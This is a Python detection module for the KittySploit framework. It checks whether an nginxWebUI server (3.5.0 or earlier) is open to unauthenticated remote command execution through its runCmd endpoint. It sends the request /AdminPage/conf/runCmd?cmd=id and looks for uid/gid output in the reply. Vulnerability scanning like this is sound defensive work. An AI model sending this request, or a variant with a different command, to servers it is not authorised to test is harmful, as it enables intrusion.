#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""nginxWebUI’s runCmd feature and is caused by incomplete validation of user input."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution Detection',
        'description': 'nginxWebUI’s runCmd feature and is caused by incomplete validation of user input. Attackers can exploit the vulnerability by crafting malicious data to execute arbitrary commands on a vulnerable server without authorization.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'nginx', 'nginxwebui', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/qingchenhh/qc_poc/blob/main/Goby/nginxWebUI_runCmd_rce.go',
            'https://www.ctfiot.com/124166.html',
            'https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/nginxwebui-runcmd-remote-command-execution-vulnerability',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/AdminPage/conf/runCmd?cmd=id', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('uid=\\d+\\(([^)]+)\\) gid=\\d+\\(([^)]+)\\)',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution detected",
                path='/AdminPage/conf/runCmd?cmd=id',
            )
            return True
        return False

